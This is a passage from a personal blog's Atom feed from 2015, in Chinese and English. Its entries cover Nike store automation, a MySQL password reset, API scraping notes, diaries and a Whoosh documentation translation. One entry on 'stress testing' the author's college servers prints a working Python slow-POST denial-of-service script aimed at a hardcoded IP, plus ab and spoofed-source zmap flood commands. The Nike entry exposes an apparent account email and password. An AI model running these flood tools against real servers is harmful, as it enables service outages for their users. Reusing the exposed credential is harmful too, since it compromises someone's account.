+<p>document.getElementsByClassName(‘login-text’)[0].click();!!!! !!!!elements！！！！！<br>document.getElementsByClassName(‘login-text’)[0].click()<br>document.getElementsByClassName(‘login-form<strong>input’)[0].value = 754406613@qq.com<br>document.getElementsByClassName(‘login-form</strong>input’)[0].value = “754406613@qq.com”<br>———=-=-=-====-=-=-=-=====—————————=-=-===-=-=-==——————————<br>chrome-cli execute “document.getElementsByClassName(‘login-text’)[0].click()”<br>chrome-cli execute “document.getElementsByClassName(‘login-form<strong>input’)[0].value = \”754406613@qq.com\””<br>chrome-cli execute “document.getElementsByClassName(‘login-form</strong>input’)[1].value = \”754406613Shuai\””<br>chrome-cli execute “document.getElementsByClassName(‘exp-login-submit’)[0].click()”//pc</p>
+<p>chrome-cli execute “document.getElementsByClassName(‘login-button’)[0].click()”//mobi</p>
+<p>chrome-cli execute “document.getElementsByClassName(‘login-button’)[0].click()”<br><a href="http://store.nike.com/jp/ja_jp/pw/n/1j7?sl=343738-018" target="_blank" rel="external">http://store.nike.com/jp/ja_jp/pw/n/1j7?sl=343738-018</a></p>
+<p>chrome-cli execute ‘document.getElementById(“frm-size-select”).value=document.getElementsByTagName(“option”)[1].value’</p>
+<p>chrome-cli execute ‘document.getElementById(“add-to-cart-btn”).click();’</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>获取号码的网址：<br><a href="http://store.nike.com/jp/ja_jp/pw/n/1j7?sl=343738-018" target="_blank" rel="external">http://store.nike.com/jp/ja_jp]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[How to do when you forget your Mysql password?]]></title>
+    <link href="http://kersujd.tk/2015/11/08/How-to-do-when-you-forget-your-Mysql-password/"/>
+    <id>http://kersujd.tk/2015/11/08/How-to-do-when-you-forget-your-Mysql-password/</id>
+    <published>2015-11-08T07:10:00.000Z</published>
+    <updated>2015-11-08T07:13:07.000Z</updated>
+    <content type="html"><![CDATA[<p>###1.start your mysql service</p>
+<p>###2.type </p>
+<pre><code>mysqld_safe <span class="comment">--skip-grant-tables &amp;</span>
+</code></pre><p>###3.then,login your mysql:</p>
+<pre><code>mysql -u root -<span class="tag">p</span>    
+</code></pre><p>###(4.)use the backup:<br>    mysql -u root jol &lt;jol.sql </p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>###1.start your mysql service</p>
+<p>###2.type </p>
+<pre><code>mysqld_safe <span class="comment">--skip-grant-tables &amp;</span>
+</code>]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Zhihu.com diary API experience]]></title>
+    <link href="http://kersujd.tk/2015/11/08/Zhihu-com-diary-API-experience/"/>
+    <id>http://kersujd.tk/2015/11/08/Zhihu-com-diary-API-experience/</id>
+    <published>2015-11-08T07:04:41.000Z</published>
+    <updated>2015-11-08T07:05:46.000Z</updated>
+    <content type="html"><![CDATA[<p>#知乎日报分析<br><a href="https://github.com/izzyleung/ZhihuDailyPurify/wiki/%E7%9F%A5%E4%B9%8E%E6%97%A5%E6%8A%A5-API-%E5%88%86%E6%9E%90" target="_blank" rel="external">https://github.com/izzyleung/ZhihuDailyPurify/wiki/%E7%9F%A5%E4%B9%8E%E6%97%A5%E6%8A%A5-API-%E5%88%86%E6%9E%90</a></p>
+<p>20131119开始</p>
+<p>至今</p>
+<p>每天的都抓下来 ok</p>
+<p>只抓id就行？先只抓id试试 看看规律  加上日期！ok<br><a href="http://www.jb51.net/article/30810.htm" target="_blank" rel="external">http://www.jb51.net/article/30810.htm</a></p>
+<ol>
+<li>UNIX时间戳转换为日期用函数： date()<br>一般形式：date(‘Y-m-d H:i:s’, 1156219870); </li>
+<li>日期转换为UNIX时间戳用函数：strtotime()<br>一般形式：strtotime(‘2010-03-24 08:15:42’)； </li>
+</ol>
+<p>id爬下来了 接下来就是爬内容 准备采取实时缓存的方式 就是用户看了一次就存进数据库 然后从数据库调用</p>
+<p>模板文件权限问题啊啊啊啊啊啊啊啊啊啊啊啊啊啊！</p>
+<p>注意amazeUI和tp的import标签会发生歧义<br>？？？？？？？看日志</p>
+<p>about     ok!<br>route       ok<br>autoupdate  ok<br>share  ok</p>
+<p>标题字体弄成随机的 随机数加模板的if标签  ok<br>公告配置改！ ok</p>
+<p>配置参考！！！！！！</p>
+<p>容易引发错误的循环放在最后！！</p>
+<p>#####################tp缓存！！！！！！删了！！！#######################</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>#知乎日报分析<br><a href="https://github.com/izzyleung/ZhihuDailyPurify/wiki/%E7%9F%A5%E4%B9%8E%E6%97%A5%E6%8A%A5-API-%E5%88%86%E6%9E%90" targe]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Nike.com automatic put the goods to the chart]]></title>
+    <link href="http://kersujd.tk/2015/11/08/Nike-com-automatic-put-the-goods-to-the-chart/"/>
+    <id>http://kersujd.tk/2015/11/08/Nike-com-automatic-put-the-goods-to-the-chart/</id>
+    <published>2015-11-08T07:02:54.000Z</published>
+    <updated>2015-11-08T07:03:17.000Z</updated>
+    <content type="html"><![CDATA[<p>#实现NIKE JP自动完成登陆并添加购物车功能</p>
+<p>###准备：<br>chrome-cli  shell/python</p>
+<p>###step1：<br>用chrome的审查元素的模拟手机功能打开</p>
+<pre><code><span class="symbol">http:</span>/<span class="regexp">/www.nike.com/jp</span><span class="regexp">/ja_jp/</span>
+</code></pre><p>###setp2：</p>
+<p>根据货号 输入（或执行chrome-cli open <url>自动进入）网址：</url></p>
+<pre><code><span class="symbol">http:</span>/<span class="regexp">/store.nike.com/jp</span><span class="regexp">/ja_jp/pw</span><span class="regexp">/n/</span><span class="number">1</span>j7?sl=（<span class="number">343738</span>-<span class="number">018</span>你的货号）
+</code></pre><p>###setp3:<br>执行一系列命令:<br>登陆：</p>
+<pre><code>chrome-cli<span class="instruction"> execute </span><span class="string">"document.getElementsByClassName('login-text')[0].click()"</span>
+chrome-cli<span class="instruction"> execute </span><span class="string">"document.getElementsByClassName('login-form__input')[0].value = \"</span>（754406613@qq.com你的账号）\<span class="string">""</span>
+chrome-cli<span class="instruction"> execute </span><span class="string">"document.getElementsByClassName('login-form__input')[1].value = \"</span>（754406613Shuai\<span class="string">"你的密码）"</span>
+chrome-cli<span class="instruction"> execute </span>“document.getElementsByClassName('login-button'<span class="function">)</span><span class="keyword">[</span>0].click(<span class="function">)</span><span class="string">"</span>
+</code></pre><p>扫货：</p>
+<pre><code>chrome-cli<span class="instruction"> execute </span>'document.getElementById(<span class="string">"frm-size-select"</span><span class="function">)</span>.value=document.getElementsByTagName(<span class="string">"option"</span><span class="function">)</span><span class="keyword">[</span>1].value'
+chrome-cli<span class="instruction"> execute </span>'document.getElementById(<span class="string">"add-to-cart-btn"</span><span class="function">)</span>.click(<span class="function">)</span>;'
+</code></pre><p>完成。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>#实现NIKE JP自动完成登陆并添加购物车功能</p>
+<p>###准备：<br>chrome-cli  shell/python</p>
+<p>###step1：<br>用chrome的审查元素的模拟手机功能打开</p>
+<pre><code><span class="]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[c++ memory Bomb]]></title>
+    <link href="http://kersujd.tk/2015/11/05/c-memory-Bomb/"/>
+    <id>http://kersujd.tk/2015/11/05/c-memory-Bomb/</id>
+    <published>2015-11-05T08:55:19.000Z</published>
+    <updated>2015-11-05T08:59:43.000Z</updated>
+    <content type="html"><![CDATA[<p>#C++ memory Bomb</p>
+<pre><code>struct <span class="keyword">node</span><span class="identifier">
+</span><span class="title">{
+  int</span> i[<span class="number">10000</span>];
+  <span class="keyword">node</span><span class="identifier"> </span><span class="title">*next</span>;
+}*head;
+int main()
+{
+  head = new <span class="keyword">node</span><span class="identifier"></span><span class="title">;
+  while</span>(<span class="number">1</span>)
+    {
+      head-&gt;<span class="variable">next=</span>new <span class="keyword">node</span><span class="identifier"></span><span class="title">;
+      head</span>=head-&gt;next;
+    }
+}
+</code></pre>]]></content>
+    <summary type="html">
+    <![CDATA[<p>#C++ memory Bomb</p>
+<pre><code>struct <span class="keyword">node</span><span class="identifier">
+</span><span class="title">{
+  int</spa]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[diary]]></title>
+    <link href="http://kersujd.tk/2015/11/03/diary/"/>
+    <id>http://kersujd.tk/2015/11/03/diary/</id>
+    <published>2015-11-03T15:40:55.000Z</published>
+    <updated>2015-11-03T15:46:55.000Z</updated>
+    <content type="html"><![CDATA[<p>Today is the first day that i really  use this blog.It’s nice.</p>
+<p>This evening ,Priceness become cute and warm to me.</p>
+<p>Shit ,the key board looks like a rainbow but feel like a skin.</p>
+<p>This evening i help my teacher to teach C lang to Grade-15 students, many nice girl,many foolish,and many<br> coder…</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>Today is the first day that i really  use this blog.It’s nice.</p>
+<p>This evening ,Priceness become cute and warm to me.</p>
+<p>Shit ,th]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[对学院部分网站的压力测试]]></title>
+    <link href="http://kersujd.tk/2015/11/01/test-1/"/>
+    <id>http://kersujd.tk/2015/11/01/test-1/</id>
+    <published>2015-11-01T12:10:10.000Z</published>
+    <updated>2015-11-01T12:48:20.000Z</updated>
+    <content type="html"><![CDATA[<p>#对学院部分网站的压力测试总结（附命令及源码）</p>
+<p>###0x00<br>最近几天，我就自己学院和计算机中心的两个网站进行了几次压力测试，终于把服务器从一台笔记本都能打瘫搞到了几台云服务器都打不瘫的地步。</p>
+<p>###0x01<br>两台服务器分别是一台用来内网上网许可验证的服务器和一台在线c++考试的服务器（<a href="https://github.com/Ph0enixxx/hustoj" target="_blank" rel="external">https://github.com/Ph0enixxx/hustoj</a>）</p>
+<p>以下是我用到的命令和代码：</p>
+<p>1）利用Apache自带的ab工具</p>
+<pre><code>ab -n <span class="number">1000000</span> -c <span class="number">200</span> http:<span class="comment">//x.x.119.110/</span>
+</code></pre><p>每个服务器都显示了较大程度的卡顿</p>
+<p>2）python ddos代码：</p>
+<p>这是网上找到的一个http慢攻击的代码</p>
+<p>和1的原理差不多，不过威力更大。</p>
+<pre><code> <span class="comment">#!/usr/bin/env python  </span>
+<span class="keyword">import</span> socket  
+<span class="keyword">import</span> time  
+<span class="keyword">import</span> threading  
+<span class="comment">#Pressure Test,ddos tool  </span>
+<span class="comment">#---------------------------  </span>
+MAX_CONN=<span class="number">2000000</span>  
+PORT=<span class="number">80</span>  
+HOST=<span class="string">"202.194.119.106"</span>
+PAGE=<span class="string">"/"</span>  
+<span class="comment">#---------------------------  </span>
+
+buf=(<span class="string">"POST %s HTTP/1.1\r\n"</span>  
+<span class="string">"Host: %s\r\n"</span>  
+<span class="string">"Content-Length: 10000000\r\n"</span>  
+<span class="string">"Cookie: dklkt_dos_test\r\n"</span>  
+<span class="string">"\r\n"</span> % (PAGE,HOST))  
+
+socks=[]  
+
+<span class="function"><span class="keyword">def</span> <span class="title">conn_thread</span><span class="params">()</span>:</span>  
+    <span class="keyword">global</span> socks  
+    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,MAX_CONN):  
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
+        <span class="keyword">try</span>:  
+            s.connect((HOST,PORT))  
+            s.send(buf)  
+            <span class="keyword">print</span> <span class="string">"Send buf OK!,conn=%d\n"</span>%i  
+            socks.append(s)  
+        <span class="keyword">except</span> Exception,ex:  
+            <span class="keyword">print</span> <span class="string">"Could not connect to server or send error:%s"</span>%ex  
+            time.sleep(<span class="number">10</span>)  
+<span class="comment">#end def  </span>
+
+<span class="function"><span class="keyword">def</span> <span class="title">send_thread</span><span class="params">()</span>:</span>  
+    <span class="keyword">global</span> socks  
+    <span class="keyword">while</span> <span class="keyword">True</span>:  
+        <span class="keyword">for</span> s <span class="keyword">in</span> socks:  
+            <span class="keyword">try</span>:  
+                s.send(<span class="string">"f"</span>)  
+                <span class="comment">#print "send OK!"  </span>
+            <span class="keyword">except</span> Exception,ex:  
+                <span class="keyword">print</span> <span class="string">"Send Exception:%s\n"</span>%ex  
+                socks.remove(s)  
+                s.close()  
+        time.sleep(<span class="number">1</span>)  
+<span class="comment">#end def  </span>
+
+conn_th=threading.Thread(target=conn_thread,args=())  
+send_th=threading.Thread(target=send_thread,args=())  
+
+conn_th.start()  
+send_th.start() 
+</code></pre><p>3）zmap<br>zmap是一个快速的扫描器，我参考了<a href="http://drops.wooyun.org/tools/515" target="_blank" rel="external">Zmap详细用户手册和DDOS的可行性</a><br>这篇文章</p>
+<p>代码如下：</p>
+<pre><code>sudo zmap -P <span class="number">10000000</span> -s <span class="number">2000</span>-<span class="number">60000</span> -S <span class="number">20.20</span><span class="number">.20</span><span class="number">.0</span>-<span class="number">200.200</span><span class="number">.200</span><span class="number">.200</span> x.x<span class="number">.119</span><span class="number">.106</span> -p <span class="number">80</span>
+</code></pre><p>解决：</p>
+<p>设置iptables</p>
+<pre><code><span class="comment">iptables</span> <span class="literal">-</span><span class="comment">I</span> <span class="comment">INPUT</span> <span class="literal">-</span><span class="comment">p</span> <span class="comment">tcp</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">dport</span> <span class="comment">80</span> <span class="literal">-</span><span class="comment">m</span> <span class="comment">connlimit</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">connlimit</span><span class="literal">-</span><span class="comment">above</span> <span class="comment">30</span> <span class="literal">-</span><span class="comment">j</span> <span class="comment">REJECT</span>
+</code></pre><p>单个ip最大连接数30 超过者访问拒绝</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>#对学院部分网站的压力测试总结（附命令及源码）</p>
+<p>###0x00<br>最近几天，我就自己学院和计算机中心的两个网站进行了几次压力测试，终于把服务器从一台笔记本都能打瘫搞到了几台云服务器都打不瘫的地步。</p>
+<p>###0x01<br>两台服务器分别是一台用]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Hello World]]></title>
+    <link href="http://kersujd.tk/2015/11/01/hello-world/"/>
+    <id>http://kersujd.tk/2015/11/01/hello-world/</id>
+    <published>2015-11-01T11:40:52.000Z</published>
+    <updated>2015-11-01T11:40:52.000Z</updated>
+    <content type="html"><![CDATA[<p>Welcome to <a href="http://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="http://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="http://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
+<h2 id="Quick_Start">Quick Start</h2><h3 id="Create_a_new_post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a href="http://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
+<h3 id="Run_server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="http://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
+<h3 id="Generate_static_files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="http://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
+<h3 id="Deploy_to_remote_sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="http://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>Welcome to <a href="http://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="http://hexo.io]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://kersujd.tk/2015/10/28/zmap_%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0/"/>
+    <id>http://kersujd.tk/2015/10/28/zmap_常用参数/</id>
+    <published>2015-10-28T06:42:06.000Z</published>
+    <updated>2015-10-28T06:42:06.000Z</updated>
+    <content type="html"><![CDATA[<p>#Zmap 常用参数：</p>
+<p>###常用参数：</p>
+<p>-p 要扫描的TCP 端口 (ex. -p 443)</p>
+<p>-o 将结果写入文件 (ex. -o ./result.txt)</p>
+<p>-b 黑名单，输入黑名单时将不会扫描这些ip</p>
+<p>###搜索选项：</p>
+<p>-n 扫描目标ip数量上限，这个可以是一个数字或者一个百分比</p>
+<p>-N 扫描结果上限，当获得这个数量的目标后zmap将退出</p>
+<p>-t 设置发送包的长度</p>
+<p>-r 设置每秒发送的速度</p>
+<p>-B 设置带宽 (ex. -B 10M)</p>
+<p>-c 设定接收包的超时时间</p>
+<p>-e 种子数量</p>
+<p>-T 发包线程数，缺省值为1</p>
+<p>-P 发送给每个探测ip的包数量</p>
+<p>-d debug模式，将每个包打印出来</p>
+<p>###网络选项：</p>
+<p>-s 扫描端口列表</p>
+<p>-S 扫描ip地址列表</p>
+<p>-G 设置MAC地址</p>
+<p>-i 设置网卡</p>
+<p>###探测选项<br>–list-probe-modules 列出探测模块</p>
+<p>-M, –probe-module=name 选择探测模块</p>
+<p>–probe-args=args 探测模块的参数</p>
+<p>–list-output-fields 列出探测模块可以输出的字段</p>
+<p>###输出选项</p>
+<p>–list-output-modules 列出可用的输出模块</p>
+<p>-O 选择输出模块和参数</p>
+<p>-f 逗号分隔的方式列出输出模块的字段</p>
+<p>###额外参数</p>
+<p>-C 读取配置文件</p>
+<p>-q 安静模式</p>
+<p>-g 在扫描完成后打印扫描报告</p>
+<p>-v 扫描报告的详细程度(0-5,缺省为3)</p>
+<p>-h 打印帮助</p>
+<p>-V 打印版本</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>#Zmap 常用参数：</p>
+<p>###常用参数：</p>
+<p>-p 要扫描的TCP 端口 (ex. -p 443)</p>
+<p>-o 将结果写入文件 (ex. -o ./result.txt)</p>
+<p>-b 黑名单，输入黑名单时将不会扫描这些ip</p>
+<]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://kersujd.tk/2015/10/21/rectangle/"/>
+    <id>http://kersujd.tk/2015/10/21/rectangle/</id>
+    <published>2015-10-21T08:15:48.000Z</published>
+    <updated>2015-10-21T08:15:48.000Z</updated>
+    <content type="html"><![CDATA[<h2 id="#Rectangle">#Rectangle</h2><p>###width:<strong>double</strong></p>
+<h2 id="###height:double">###height:<strong>double</strong></h2><p>###Rectangle()</p>
+<p>###Rectangle(w:double,h:double)</p>
+<p>###getArea():double</p>
+<p>###getPerimeter():double</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h2 id="#Rectangle">#Rectangle</h2><p>###width:<strong>double</strong></p>
+<h2 id="###height:double">###height:<strong>double</strong></h2><]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://kersujd.tk/2015/10/10/2015.10.10/"/>
+    <id>http://kersujd.tk/2015/10/10/2015.10.10/</id>
+    <published>2015-10-10T14:37:06.000Z</published>
+    <updated>2015-10-10T14:37:06.000Z</updated>
+    <content type="html"><![CDATA[<p>#2015.10.10<br>好久没写日记了，也没啥可写，不过一天一天干着毁灭世界的准备罢了。</p>
+<p>今天和pq去看了拯救吾先生，华仔和大反派演的都不错。</p>
+<p>属于自己的全文检索引擎做好了，下一步是做一个属于自己的分词系统和一个宿舍文件分享网站。</p>
+<p>就说这些吧 明天接着出去约出去浪出去疯。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>#2015.10.10<br>好久没写日记了，也没啥可写，不过一天一天干着毁灭世界的准备罢了。</p>
+<p>今天和pq去看了拯救吾先生，华仔和大反派演的都不错。</p>
+<p>属于自己的全文检索引擎做好了，下一步是做一个属于自己的分词系统和一个宿舍文件分享网站。</p>
+]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://kersujd.tk/2015/09/17/whoosh_2.5.6_%E6%96%87%E6%A1%A3/"/>
+    <id>http://kersujd.tk/2015/09/17/whoosh_2.5.6_文档/</id>
+    <published>2015-09-17T07:25:57.000Z</published>
+    <updated>2015-09-17T07:25:57.000Z</updated>
+    <content type="html"><![CDATA[<p>#Whoosh 2.5.6 文档<br>原地址：<a href="http://pythonhosted.org/Whoosh/index.html" target="_blank" rel="external">http://pythonhosted.org/Whoosh/index.html</a></p>
+<p>译者：邵英帅</p>
+<p><strong>Whoosh</strong>的作者是Matt Chaput。你可以在 Whoosh <a href="http://bitbucket.org/mchaput/whoosh" target="_blank" rel="external">Bitbucket页面</a>上看到很多杰出的问题也可以通过<a href="http://groups.google.com/group/whoosh" target="_blank" rel="external">Whoosh邮件列表</a>来获得帮助.</p>
+<p>===========================</p>
+<p>##快速开始</p>
+<p>Whoosh是一个包含用来创建索引和检索的类和函数库。它能够让你开发迎合你自己内容的搜索引擎。举个栗子，如果你创建了一个博客软件，你可以用Whoosh来添加一个搜索用户和博客内容的功能。</p>
+<p>###一个简单的实例：</p>
+<pre><code><span class="prompt">&gt;&gt;&gt; </span><span class="keyword">from</span> whoosh.index <span class="keyword">import</span> create_in
+<span class="prompt">&gt;&gt;&gt; </span><span class="keyword">from</span> whoosh.fields <span class="keyword">import</span> *
+<span class="prompt">&gt;&gt;&gt; </span>schema = Schema(title=TEXT(stored=<span class="keyword">True</span>),     path=ID(stored=<span class="keyword">True</span>), content=TEXT)
+<span class="prompt">&gt;&gt;&gt; </span>ix = create_in(<span class="string">"indexdir"</span>, schema)
+<span class="prompt">&gt;&gt;&gt; </span>writer = ix.writer()
+<span class="prompt">&gt;&gt;&gt; </span>writer.add_document(title=<span class="string">u"First document"</span>, path=<span class="string">u"/a"</span>,
+<span class="prompt">... </span>                    content=<span class="string">u"This is the first document we've added!"</span>)
+<span class="prompt">&gt;&gt;&gt; </span>writer.add_document(title=<span class="string">u"Second document"</span>, path=<span class="string">u"/b"</span>,
+<span class="prompt">... </span>                    content=<span class="string">u"The second one is even more interesting!"</span>)
+<span class="prompt">&gt;&gt;&gt; </span>writer.commit()
+<span class="prompt">&gt;&gt;&gt; </span><span class="keyword">from</span> whoosh.qparser <span class="keyword">import</span> QueryParser
+<span class="prompt">&gt;&gt;&gt; </span><span class="keyword">with</span> ix.searcher() <span class="keyword">as</span> searcher:
+<span class="prompt">... </span>    query = QueryParser(<span class="string">"content"</span>, ix.schema).parse(<span class="string">"first"</span>)
+<span class="prompt">... </span>    results = searcher.search(query)
+<span class="prompt">... </span>    results[<span class="number">0</span>]
+...
+{<span class="string">"title"</span>: <span class="string">u"First document"</span>, <span class="string">"path"</span>: <span class="string">u"/a"</span>}
+</code></pre><p>###索引对象：<br>如果想使用Whoosh，你需要一个索引对象。当你第一次使用它时，你必须定义索引。这份索引包含了你的关键词列表。字段是每个在索引中的文档信息，类似于文章的标题和内容。一个字段可以被索引（能够被搜索到）或者被存储（在被搜索到时作为内容返回）。</p>
+<p>本实例中的索引包含两个字段：“title”和“content”</p>
+<pre><code>from whoosh<span class="class">.fields</span> import Schema,TEXT
+schema = <span class="function"><span class="title">Schema</span><span class="params">(title=TEXT,content=TEXT)</span></span>
+</code></pre><p>你只要做一次索引，在你创建它的时候。<br>当你创建索引对象，你使用关键词参数映射的字段类型。索引和类型列表会定义什么是可以被搜索的。Whoosh预定义了一些非常有用的类型，这让你可以非常简单的创建自己的程序。</p>
+<p><em>whoosh.fields.ID</em></p>
+<p>这种类型的索引是独立的（它不能被拆开成单独的字）通常用整个值来作为标识。</p>
+<p><em>whoosh.fields.STORED</em></p>
+<p>这种字段是用文档来存储的，但是不会被索引。这种字段类型不能被索引也不能搜到，它的作用是给用户展示你的搜索结果信息。</p>
+<p><em>whoosh.fields.TEXT</em></p>
+<p>这种类型是作为文本的主体。它索引（也可选择的存储）了文本和条件位置来解析搜索语句。</p>
+<p><em>whoosh.fields.NUMERIC</em></p>
+<p>这种类型是数字，你可以存储整数或者浮点数。</p>
+<p><em>whoosh.fields.BOOLEAN</em></p>
+<p>这种类型是为了存储布尔（真/假）值。</p>
+<p><em>whoosh.fields.DATETIME</em></p>
+<p>这种类型是为了时间对象。请看<a href="http://pythonhosted.org/Whoosh/dates.html" target="_blank" rel="external">索引和解析时间</a>来获取更多的信息。</p>
+<p><em>whoosh.fields.NGRAM and whoosh.fields.NGRAMWORDS</em></p>
+<p>？？？？？？？</p>
+<p>一旦你有了索引列表，你可以用<code>create_in</code>函数创建一个索引：</p>
+<pre><code>import os<span class="class">.path</span>
+from whoosh<span class="class">.index</span> import create_in
+<span class="keyword">if</span> not os<span class="class">.path</span><span class="class">.exists</span>(<span class="string">"index"</span>):
+os.<span class="function"><span class="title">mkdir</span><span class="params">(<span class="string">"index"</span>)</span></span>
+ix = <span class="function"><span class="title">create_in</span><span class="params">(<span class="string">"index"</span>, schema)</span></span>
+</code></pre><p>当你创建完一个列表。你能够通过<code>open_dir</code>函数来打开它：<br>    from whoosh.index import open_dir<br>    ix = open_dir(“index”)</p>
+<p>##IndexWriter对象</p>
+<p>OK，我们以及创建了一个Index对象，现在我们可以开始添加文档了。Index对象中的writer()方法将返回你添加文档的IndexWriter对象。<code>add_document(**kwargs)</code>方法接收字段内容被索引的值：</p>
+<pre><code>writer = ix.writer()
+writer.add_document(title=<span class="string">u"My document"</span>, content=<span class="string">u"This is my document!"</span>,
+                path=<span class="string">u"/a"</span>, tags=<span class="string">u"first short"</span>, icon=<span class="string">u"/icons/star.png"</span>)
+writer.add_document(title=<span class="string">u"Second try"</span>, content=<span class="string">u"This is the second example."</span>,
+                path=<span class="string">u"/b"</span>, tags=<span class="string">u"second short"</span>, icon=<span class="string">u"/icons/sheep.png"</span>)
+writer.add_document(title=<span class="string">u"Third time's the charm"</span>, content=<span class="string">u"Examples are many."</span>,
+                path=<span class="string">u"/c"</span>, tags=<span class="string">u"short"</span>, icon=<span class="string">u"/icons/book.png"</span>)
+writer.commit()
+</code></pre><blockquote>
+<p>你没必要为每个字段都添加值，在通过字段查找出文档后Whoosh就不在乎之后的事情了。</p>
+</blockquote>
+<p>在IndexWriter中调用<code>commit()</code>来保存你在索引中添加的文档:</p>
+<pre><code>writer.<span class="function"><span class="title">commit</span><span class="params">()</span></span>
+</code></pre><p>###搜索对象：<br>为了开始搜索索引，我们需要一个搜索对象：</p>
+<pre><code>searcher = ix.<span class="function"><span class="title">seacher</span><span class="params">()</span></span>
+</code></pre><p>你通常会想去打开<code>seacher</code>用with声明所以<code>seacher</code>是可以在你用完之后自动关闭的。</p>
+<pre><code><span class="keyword">with</span> ix.searcher<span class="literal">()</span> <span class="keyword">as</span> searcher:
+</code></pre><p>这当然与下面的代码功能相等：</p>
+<pre><code>try:
+    searcher = ix.<span class="function"><span class="title">searcher</span><span class="params">()</span></span>
+...
+finally:
+        searcher.<span class="function"><span class="title">close</span><span class="params">()</span></span>
+</code></pre><p>这个搜索器的search()方法取用了一个查询对象。你可以直接构造这个查询对象或者用一个查询解析器来解析提交查询的字符串。</p>
+<p>举个栗子，这个查询能够将在”content”中包括”apple”和”bear”的文档找出来：</p>
+<pre><code><span class="keyword">from</span> whoosh.query <span class="keyword">import</span> *
+myquery = And([Term(<span class="string">"content"</span>, <span class="string">u"apple"</span>), Term(<span class="string">"content"</span>, <span class="string">"bear"</span>)])
+</code></pre><p>为了解析搜索的字符串，你可以用在qparser模块中的缺省的查询解析器。QueryParser构造函数的第一个参数是主要的搜索字段。这通常是”body text”字段。第二个可选的参数是一个告诉Whoosh如何解析字段的索引列表：</p>
+<pre><code>from whoosh<span class="class">.qparser</span> import QueryParser
+parser = <span class="function"><span class="title">QueryParser</span><span class="params">(<span class="string">"content"</span>, ix.schema)</span></span>
+myquery = parser.<span class="function"><span class="title">parse</span><span class="params">(querystring)</span></span>    
+</code></pre><p>一旦你获得了一个搜索器和一个查询的对象，你可以用搜索器的search()方法去运行和获得结果对象。</p>
+<pre><code><span class="prompt">&gt;&gt;</span>&gt; results = searcher.search(myquery)
+<span class="prompt">&gt;&gt;</span>&gt; print(len(results))
+<span class="number">1</span>
+<span class="prompt">&gt;&gt;</span>&gt; print(results[<span class="number">0</span>])
+{<span class="string">"title"</span><span class="symbol">:</span> <span class="string">"Second try"</span>, <span class="string">"path"</span><span class="symbol">:</span> <span class="string">"/b"</span>, <span class="string">"icon"</span><span class="symbol">:</span> <span class="string">"/icons/sheep.png"</span>}
+</code></pre>]]></content>
+    <summary type="html">
+    <![CDATA[<p>#Whoosh 2.5.6 文档<br>原地址：<a href="http://pythonhosted.org/Whoosh/index.html" target="_blank" rel="external">http://pythonhosted.org/Whoosh]]>
+    </summary>
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://kersujd.tk/2015/09/14/oj%E5%85%A8%E6%96%87%E6%A3%80%E7%B4%A2%E5%8A%9F%E8%83%BD%E6%96%87%E6%A1%A3(alpha0.1)/"/>
+    <id>http://kersujd.tk/2015/09/14/oj全文检索功能文档(alpha0.1)/</id>
+    <published>2015-09-14T13:19:42.000Z</published>
+    <updated>2015-09-14T13:19:42.000Z</updated>
+    <content type="html"><![CDATA[<p>#OJ全文检索功能文档(Alpha0.1)</p>
+<p>Written by Radish.  2015.9</p>
+<hr>
